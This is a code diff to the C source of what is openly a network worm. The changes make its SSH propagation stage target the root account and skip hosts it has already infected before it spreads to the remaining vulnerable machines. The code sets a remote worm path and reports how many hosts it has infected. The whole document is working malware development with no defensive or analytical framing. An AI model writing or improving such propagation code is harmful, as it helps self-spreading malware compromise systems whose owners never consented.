@@ -15,7 +15,7 @@
 // Configuration
 #define CVE_SSH_PROPAGATION_ID 2
 #define MAX_SSH_KEYS 100
-#define SSH_USER "bdsm"
+#define SSH_USER "root"
 #define SSH_TIMEOUT 10
 #define REMOTE_WORM_PATH "/tmp/worm"
 
@@ -494,17 +494,34 @@ int cve_ssh_propagation_execute(const char* target_ip) {
         return 0;
     }
     
-    printf("[*] Propagating to %d vulnerable host(s)...\n", host_count);
+    // Filter out already infected hosts before attempting propagation
+    char* uninfected_hosts[MAX_VULNERABLE_HOSTS];
+    int uninfected_count = 0;
+    for (int i = 0; i < host_count; i++) {
+        if (!is_infected(hosts[i])) {
+            uninfected_hosts[uninfected_count] = hosts[i];
+            uninfected_count++;
+        } else {
+            printf("[*] Skipping %s (already infected)\n", hosts[i]);
+        }
+    }
+    
+    if (uninfected_count == 0) {
+        printf("[*] All vulnerable hosts are already infected, skipping propagation\n");
+        return 1;  // Return success since we've already infected all targets
+    }
+    
+    printf("[*] Propagating to %d uninfected vulnerable host(s)...\n", uninfected_count);
     
     int success_count = 0;
-    for (int i = 0; i < host_count; i++) {
-        printf("\n--- Propagating to %s ---\n", hosts[i]);
-        if (propagate_to_host(hosts[i])) {
+    for (int i = 0; i < uninfected_count; i++) {
+        printf("\n--- Propagating to %s ---\n", uninfected_hosts[i]);
+        if (propagate_to_host(uninfected_hosts[i])) {
             success_count++;
         }
     }
     
-    printf("\n[+] Propagation complete: %d/%d hosts infected\n", success_count, host_count);
+    printf("\n[+] Propagation complete: %d/%d uninfected hosts infected\n", success_count, uninfected_count);
     return (success_count > 0) ? 1 : 0;
 }
 
